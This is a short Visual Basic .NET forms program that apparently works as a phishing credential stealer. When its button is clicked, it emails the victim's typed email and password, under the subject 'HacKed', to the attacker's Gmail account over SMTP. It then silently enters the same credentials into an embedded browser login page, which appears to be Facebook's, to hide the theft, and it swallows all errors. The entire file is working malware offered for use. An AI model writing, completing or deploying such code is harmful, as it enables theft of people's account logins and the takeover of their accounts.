Imports System.Net.Mail
Public Class Form1

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim HusMoh As New MailMessage
        Try
            HusMoh.From = New MailAddress("your Email")
            HusMoh.To.Add("your Email")
            HusMoh.Subject = "HacKed"
            HusMoh.Body = "Email: " + TextBox1.Text + " Password: " + TextBox2.Text
            Dim smtp As New SmtpClient("smtp.gmail.com")
            smtp.Port = 587
            smtp.EnableSsl = True
            smtp.Credentials = New System.Net.NetworkCredential("Your Email", TextBox3.Text)
            smtp.Send(HusMoh)
            WebBrowser1.Visible = True
            WebBrowser1.Document.GetElementById("ema­il").SetAttribute("value", TextBox1.Text)
            WebBrowser1.Document.GetElementById("pas­s").SetAttribute("value", TextBox2.Text)
            WebBrowser1.Document.GetElementById("log­inbutton").InvokeMember("click")
        Catch ex As Exception
        End Try

    End Sub
End Class
